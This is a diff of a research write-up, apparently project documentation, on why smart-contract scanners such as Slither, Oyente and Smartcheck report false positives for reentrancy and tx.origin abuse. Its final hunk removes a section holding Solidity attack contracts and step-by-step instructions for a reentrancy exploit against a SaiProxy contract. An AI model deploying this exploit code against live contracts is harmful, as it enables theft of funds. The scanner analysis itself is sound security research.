@@ -33,25 +33,19 @@ As the reentrancy caused some significant losses in the past `daoAttack <https:/
 -  Using ``if`` lock(s) to prevent reentrancy. However, these DMs are seldom discussed in relevant studies or considered in existing scanners. Hence, the ignorance about possible DMs will result in the high FP rate of detection
 
 
-.. image:: interval.png
-    :width: 500px
-    :alt: interval_line
-    :align: center
-
 For the first DM, in CB1_, according to rule of **Slither**:
 
 .. math::
 
-    `r(var_{g}) \vee w(var_{g}) \succ externCall \succ w(var_{g}) \Rightarrow \text{reentrancy}`
+    r(var_{g}) \vee w(var_{g}) \succ externCall \succ w(var_{g}) \Rightarrow \text{reentrancy}
 
 
 CB1_ is reported as a reentrancy  by **Slither**---firstly, it writes to the public variable ``total_reward``; then calls external function ``buyTokens.value``; last, writes to the public variable ``winnerPoolTotal``. However, in reality, reentrancy will never be triggered by external attackers due to the hard-coded address value at line 13 in CB1_. Similarly, in CB2_, we show a FP for **Oyente**, according to its run-time detection rule below:
 
 
-.. image:: oyente_rule.png
-    :width: 600px
-    :alt: oyente_rule
-    :align: center
+.. math::
+
+    \big ( r(var_{g}) \wedge (gas_{trans}) > 2300) \wedge (amt_{bal} > amt_{trans}) \wedge var_{g} \text{changed before external call \big ) \Rightarrow \text{reentrancy}
 
 
 where r(varg) means read operation(s) to a public variable, gas(trans) > 2300 means the gas for transaction must be larger than 2300, amt(bal) > amt(trans) means the balance amount must be larger than transfer amount, and lastly the global variable could be changed before external calls.
@@ -60,37 +54,13 @@ where r(varg) means read operation(s) to a public variable, gas(trans) > 2300 me
 Although CB2_ satisfies all the four conditions, it actually could not be triggered by external attackers, again due to the only hard-coded address allowed in the transaction.
 
 
-.. image:: interval.png
-    :width: 600px
-    :alt: interval_line
-    :align: center
-
-
 For the second DM of using private modifier, the existing scanners fail to consider that. In our manual inspection  of FPs, we consider the following defense is successful: if this private function (reported by **Slither** or **Oyente** as reentrancy) is never called by other public  functions in the same contract, or only called by the public functions that have no loop path in  their CFGs. Under such scenario, the reported function will actually never be recursively called by external attackers. For example, if we changed the modifier of  function ``buyOne`` from ``public`` to ``private`` at line 1 in CBoriginal_, **Slither** would still report it as a reentrancy vulnerability---but it could never be called by external attackers, as it is not called in other functions. We find that **Oyente** also suffers from this FP issue.
-
-
-.. image:: interval.png
-    :width: 600px
-    :alt: interval_line
-    :align: center
 
 
 For the third DM of adopting user-defined modifier for protection, we find some interesting cases that are falsely reported by existing scanners. For example, CB3_ actually takes into account the security issue and adds the self-defined modifier *onlyAdmin* before the possibly vulnerable function ``regstDocs``. Since ``onlyAdmin`` restricts that the transaction can be only done by the ``admin`` or ``owner`` role, otherwise the transactions will be reverted. In such a way, ``regstDocs`` could not be recursively called by external attackers.
 
 
-.. image:: interval.png
-    :width: 600px
-    :alt: interval_line
-    :align: center
-
-
 Different from the above three DMs on permission control to prevent external malicious calls, the last DM is to prevent the recursive entrance for the function---eliminating the issue from root. For instance, in CB4_, the internal instance variable ``reEntered`` will be checked at line 5 before processing the business logic between line 8 and 10. To prevent the reentering due to calling ``ZTHTKN.buyAndSetDivPercentage.value``, ``reEntered`` will switched to ``true``; after the transaction is done, it will be reverted to ``false`` to allow other transactions.
-
-
-.. image:: interval.png
-    :width: 600px
-    :alt: interval_line
-    :align: center
 
 
 Totally, 457 FP cases are manually identified for **Slither**. Among them, 216 FPs are attributed for the first DM,  76 FPs for the second,  47 FPs for the third, and only 1 FP for the forth DM and 117 for other causes. In contrast, **Oyente** has fewer FP cases (only 53 in total), among which the distribution for the four caused DMs is 5, 5, 22 and 0. 
@@ -112,11 +82,9 @@ FPs of Tx.origin Abusing
 
 For this vulnerability, **Slither** reports 34 results, none of which are FPs. **Slither**'s rule is simple but effective:
 
+.. math::
 
-.. image:: slither_rule_tx.png
-    :width: 600px
-    :alt: slither_rule_tx
-    :align: center
+    access(Tx.origin) \wedge inContrFlowCondi(Tx.origin) \Rightarrow \text{Tx.origin abusing}
 
 
 It finds all ``Tx.origin`` that appears in control flow condition. The rationale is that accessing ``Tx.Origin`` is just a bad programming practice by itself, not vulnerable. Only when used in control flow conditions, it could be manipulated for control flow hijack.
@@ -124,11 +92,9 @@ It finds all ``Tx.origin`` that appears in control flow condition. The rationale
 In contrast, **Smartcheck** reports much more cases (210) than **Slither** (34), as it is more complete in considering both control flow conditions inside a function  and the modifier code outside the function: 
 
 
-.. image:: smartcheck_rule_tx.png
-    :width: 600px
-    :alt: smartcheck_rule_tx
-    :align: center
+.. math::
 
+    access(Tx.origin) \wedge \big (inContrFlowCondi(Tx.origin) \vee inModifierCode(Tx.origin) \big ) \Rightarrow \text{Tx.origin abusing}
 
 As shown in CB3_, self-defined modifier (e.g., ``onlyAdmin``) can be imported before the function. As such modifier is used for permission control, it also affects the control flow of the program. The 149 FPs of **Smartcheck** (70.95%) are due to the reason that ``Tx.origin`` is used for a parameter of a function call, and then the return value of the function call is neither check nor used---making ``Tx.origin`` have no actual impact on control flow.
 
@@ -173,69 +139,3 @@ In this table, we show the number of the extracted AVS for each vulnerability ty
 For unexpected revert, we also find there exist some cloned instances between TPs. Especially, for the two typical scenario of  unexpected revert---the revert on single account and the revert due to failed operations on multiple accounts via a loop, we get totally 8 AVS via clustering  more than 200 TPs that are reported by **Slither** or **Oyente**.
 
 For other vulnerability types, we cannot get clusters of cloned function instances due to the fact that the triggering of vulnerability requires not much context. Since the remaining four types are all about improper checks, we design 4 or 5 AVS for each type. For example, regarding ``Tx.origin`` abusing, the existing scanners mainly check whether it is inside ``if`` statement. According to the observation mentioned in examples, we extend this with more AVS, such as checking ``Tx.origin`` inside  ``require``, ``assert`` and ``if-throw``. Similarly, we derive 5 AVS for time manipulation. Last, for unchecked low-level-call, 4 AVS are proposed to catch the improper low-level calls in loop without any validation check on return values, for functions ``call()``, ``callcode()``, ``delegatecall()`` and ``send()``.
-
-Attack code:
-::
-
-    contract TubInterface {
-        constructor() payable {}
-        SaiProxy s;
-        address victim;
-        bytes32 temp;
-        address gemp;
-        function setVictim(address _addr, address _gem) {
-            s = SaiProxy(_addr);
-            victim = _addr;
-            gemp = _gem;
-        }
-        ...
-        function cups(bytes32 cup) public returns (address, uint, uint, uint){
-            return (victim, 0, 0, 0);
-        }
-        function gem() public view returns (TokenInterface){
-            return(TokenInterface(gemp));
-        }
-        ...
-    }
-
-    contract TokenInterface {
-        bytes32 temp;
-        address tubbb;
-        SaiProxy s;
-        TubInterface tub = new TubInterface();
-        function setVictim(address _addr, address _tub) {
-            s = SaiProxy(_addr);
-            tubbb = _tub;
-        }
-        constructor() payable {}
-        ...
-        function deposit() public payable{
-            s.lock.value(1 ether)(tubbb, temp);
-                //s.open(this);
-        }
-        ...
-    }
-
-Attacked code:
-::
-
-    contract SaiProxy is DSMath {
-        ...
-        function lock(address tub_, bytes32 cup) public payable {
-            if (msg.value > 0) {
-                TubInterface tub = TubInterface(tub_);
-
-                (address lad,,,) = tub.cups(cup);
-                require(lad == address(this), "cup-not-owned");
-
-                tub.gem().deposit.value(msg.value)();
-                ...
-            }
-        }
-    }
-
-In this case, the goal of our reentrancy is ``tub.gem().deposit.value(msg.value)();`` in the victim code. To reach our goal we need pass three conditions. Firstly we need to make sure the *msg.value* is greater than 0. Next we need to declare a new ``TuberInterface`` instance and call its ``cups`` function to return a address to the variable ``lad``. Last, we need to make sure the address stored in `lad` equals to the address of the victim contract.
-
-**Preparation.** We call ``setVictim`` function in attack code to set the address of victim code to the variable ``_addr`` and set the address of the other attack contract ``TokenInterface`` to ``_gem``. Next we call the other ``setVictim`` function in contract ``TokenInterface`` then set the address of victim code to ``_addr`` and set ``tubbb`` an address the same as ``_addr``. 
-
-**Attack.** The attacker call `deposit` function, it calls ``lock`` function in victim contract.  The ``if`` condition is satisfied because we our call is appended by ``.value``. Next, the contract initialize  an instance of the contract ``TubInterface`` and call ``cup`` to get the address. Unfortunately, the function involved in this attack is well manipulated and we won't let it fail. Then the contract checks whether the ``lad`` equals to the address of the victim contract. It doesn't work. We finally get to the key statement ``tub.gem().deposit`` which calls back to the `gem` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.
